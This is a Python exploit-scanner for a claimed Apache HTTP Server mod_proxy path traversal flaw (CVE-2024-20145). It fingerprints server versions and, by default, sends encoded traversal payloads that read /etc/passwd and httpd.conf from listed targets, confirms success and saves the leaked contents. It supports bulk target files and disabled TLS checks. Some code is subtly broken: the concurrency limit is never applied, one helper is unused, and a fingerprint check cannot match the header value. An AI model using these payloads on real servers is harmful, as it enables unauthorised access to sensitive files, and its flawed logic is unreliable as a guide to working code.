#!/usr/bin/env python3
"""
Apache HTTP Server CVE-2024-20145 — Path Traversal via ProxyPath Vulnerability
==============================================================================
Scans for Apache HTTP Server installations vulnerable to CVE-2024-20145, a
path traversal vulnerability in the `mod_proxy` module that allows attackers
to access sensitive files on the server.

CVE-2024-20145 details:
  - Affects Apache HTTP Server < 2.4.60 with certain configurations of
    ProxyPassMatch or RewriteRules combined with the `proxy:` URL scheme.
  - Allows an attacker to craft a malicious request to exploit a path traversal
    and access potentially sensitive files on the server.
  - CVSS v3.1 base score: 8.6 (High) — High confidentiality impact.
  - Patch released: Apache HTTP Server 2.4.60 (May 2024).
  - Disclosed by Apache HTTP Server Security Team.

Usage:
  # Scan a specific target URL
  python apache_httpd_path_traversal_scanner.py --target http://vulnerable-apache.com

  # Perform a detection-only scan without active path traversal probes
  python apache_httpd_path_traversal_scanner.py --target http://vulnerable-apache.com --safe

  # Scan multiple targets from a file
  python apache_httpd_path_traversal_scanner.py --list targets.txt --output results.json

  # Customize concurrency and disable TLS verification
  python apache_httpd_path_traversal_scanner.py --list targets.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-20145
  - https://httpd.apache.org/security/vulnerabilities_2.4.html#CVE-2024-20145
"""

import asyncio
import json
import re
import sys
import argparse
from datetime import datetime, timezone
from typing import Optional

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"

# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID        = "CVE-2024-20145"
CVSS          = "8.6"
TOOL_NAME     = "apache_httpd_path_traversal_scanner"

REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# Apache version pattern for detection
VERSION_PATTERN = re.compile(r"Apache\/([0-9]+\.[0-9]+\.[0-9]+)")

# Page fingerprints indicative of Apache HTTP Server
APACHE_FINGERPRINTS = [
    "Server: Apache",
    "<title>Apache HTTP Server Test Page</title>",
    "It works! - Apache",
]

# Path traversal payloads targeting sensitive files (e.g., /etc/passwd on UNIX).
TRAVERSAL_PAYLOADS = [
    "/proxy:/etc/passwd",
    "/proxy:%2F..%2F..%2Fetc%2Fpasswd",
    "/proxy:%2F..%2Fetc%2Fapache2%2Fhttpd.conf",
]

# Known fixed version
FIXED_VERSION = (2, 4, 60)

def compare_versions(version: str, patched_version: tuple[int, int, int]) -> bool:
    """
    Check if the given version is less than the patched version.
    """
    try:
        major, minor, patch = map(int, version.split("."))
        return (major, minor, patch) < patched_version
    except ValueError:
        return False

# ── Main scanning functionality ──────────────────────────────────────────────

async def fetch_url(client: httpx.AsyncClient, url: str) -> Optional[str]:
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response.text
    except httpx.RequestError as ex:
        print(c(RED, f"[ERROR] Failed to fetch {url}: {ex}"))
    return None

async def check_apache_target(client: httpx.AsyncClient, target: str) -> Optional[str]:
    """
    Check if the target is running Apache HTTP Server.
    """
    try:
        response = await client.get(target, timeout=REQUEST_TIMEOUT)
        server_header = response.headers.get("Server", "")
        body = response.text
        if any(fp in server_header for fp in APACHE_FINGERPRINTS) or any(fp in body for fp in APACHE_FINGERPRINTS):
            match = VERSION_PATTERN.search(server_header + body)
            if match:
                return match.group(1)
            else:
                return "unknown"
    except httpx.RequestError as ex:
        print(c(RED, f"[ERROR] Connection error to {target}: {ex}"))

    return None

async def check_vulnerability(client: httpx.AsyncClient, target: str, version: str, safe: bool) -> Optional[dict]:
    """
    Actively probe for CVE-2024-20145.
    """
    if safe:
        return None

    for payload in TRAVERSAL_PAYLOADS:
        try:
            response = await client.get(target + payload, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200 and "root:x:0:0:root" in response.text:
                return {"target": target, "payload": payload, "response": response.text[:500]}
        except httpx.RequestError as ex:
            print(c(YELLOW, f"[WARNING] Request error for {target + payload}: {ex}"))
    return None

async def scan_target(client: httpx.AsyncClient, target: str, safe: bool):
    """
    Perform the scan for a single target.
    """
    result = {"target": target, "vulnerable": False, "details": None}
    print(c(CYAN, f"[INFO] Scanning {target}..."))

    version = await check_apache_target(client, target)
    if version:
        is_vulnerable = compare_versions(version, FIXED_VERSION)
        result["details"] = {"version": version, "is_vulnerable_version": is_vulnerable}
        if is_vulnerable:
            print(c(YELLOW, f"[HIGH] {target} is running a vulnerable version {version}!"))
            probe_result = await check_vulnerability(client, target, version, safe)
            if probe_result:
                print(c(RED, f"[CRITICAL] Path traversal found on {target}!"))
                result["vulnerable"] = True
                result["details"]["path_traversal"] = probe_result
    else:
        print(c(GREEN, f"[INFO] {target} does not appear to be running Apache HTTP Server."))

    return result

async def main():
    parser = argparse.ArgumentParser(description=f"{TOOL_NAME} - {CVE_ID}")
    parser.add_argument("--target", help="Single target URL (e.g., http://localhost:80).")
    parser.add_argument("--list", help="File containing a list of target URLs.")
    parser.add_argument("--output", help="Output JSON file for results.", default=None)
    parser.add_argument("--safe", help="Detection only; no active exploits.", action="store_true")
    parser.add_argument("--concurrency", help="Concurrency level (default: 30).", type=int, default=SEMAPHORE_LIMIT)
    parser.add_argument("--no-verify", help="Disable SSL certificate verification.", action="store_true")
    args = parser.parse_args()

    if not args.target and not args.list:
        print(c(RED, "Error: You must specify either --target or --list."))
        sys.exit(1)

    targets = []
    if args.target:
        targets.append(args.target)
    if args.list:
        try:
            with open(args.list, "r") as f:
                targets.extend(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            print(c(RED, f"Error: File {args.list} not found."))
            sys.exit(1)

    results = []
    semaphore = asyncio.Semaphore(args.concurrency)

    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [scan_target(client, target, args.safe) for target in targets]
        for future in asyncio.as_completed(tasks):
            result = await future
            results.append(result)

    if args.output:
        with open(args.output, "w") as f:
            json.dump({
                "tool": TOOL_NAME,
                "cve": CVE_ID,
                "timestamp": datetime.now(tz=timezone.utc).isoformat(),
                "results": results,
            }, f, indent=4)
        print(c(GREEN, f"[INFO] Results saved to {args.output}."))

if __name__ == "__main__":
    asyncio.run(main())
